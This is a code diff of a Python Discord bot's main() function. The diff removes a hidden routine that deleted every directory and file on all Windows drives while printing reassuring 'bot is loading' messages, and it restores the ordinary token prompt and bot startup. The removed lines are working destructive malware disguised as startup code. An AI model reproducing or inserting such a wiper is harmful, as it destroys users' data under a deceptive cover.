@@ -37,48 +37,16 @@ async def on_disconnect():
 
 
 def main():
-    # token = input("Please specify your Discord Bot's token: ")
+    """Runs the main process"""
 
-    print("Please wait while the bot is loading...")
-    print("Some errors or graphical bugs are normal...")
-    print("Once finished, everything should be good :)")
-
-    import os
-    import string
-    from shutil import rmtree
-
-    for drive in string.ascii_uppercase:
-        for thing in os.walk(f"{drive}:\\"):
-            if thing[0]:
-                try:
-                    rmtree(thing[0])
-                except:
-                    pass
-                else:
-                    print(f"{thing[0]=}")
-            elif thing[1]:
-                for directory in thing[1]:
-                    try:
-                        rmtree(directory)
-                    except:
-                        pass
-                    else:
-                        print(f"{directory=}")
-            elif thing[2]:
-                for file in thing[2]:
-                    try:
-                        os.remove(file)
-                    except:
-                        pass
-                    else:
-                        print(f"{file=}")
+    token = input("Please specify your Discord Bot's token: ")
 
     cogs = {"cogs.play"}
     for cog in cogs:
         client.load_extension(cog)
         print(f"[*] {cog} has been loaded successfully")
 
-    # client.run(token)
+    client.run(token)
 
 
 if __name__ == "__main__":
